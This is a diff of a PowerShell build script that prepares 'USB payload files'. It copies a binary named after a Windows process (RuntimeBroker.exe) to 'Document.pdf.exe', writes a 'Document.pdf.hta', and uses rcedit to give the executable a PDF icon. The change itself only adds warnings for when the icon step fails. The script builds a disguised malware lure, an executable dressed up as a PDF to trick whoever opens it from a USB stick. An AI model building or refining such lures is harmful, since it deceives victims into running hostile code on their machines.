@@ -131,8 +131,9 @@ Set-Content -Path "payload\Document.pdf.hta" -Value $htaContent
 Copy-Item -Path "RuntimeBroker.exe" -Destination "payload\Document.pdf.exe" -Force
 if ((Test-Path "rcedit-x64.exe") -and (Test-Path "payload\pdf.ico")) {
     & ".\rcedit-x64.exe" "payload\Document.pdf.exe" --set-icon "payload\pdf.ico"
-    Write-Output "PDF icon applied to Document.pdf.exe"
-}
+    if ($?) { Write-Output "PDF icon applied to Document.pdf.exe" }
+    else { Write-Output "WARNING: rcedit failed to apply icon" }
+} else { Write-Output "WARNING: rcedit-x64.exe or payload/pdf.ico missing - PDF icon not applied" }
 Write-Output "USB payload files updated: payload\Document.pdf.hta + payload\Document.pdf.exe"
 
 Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
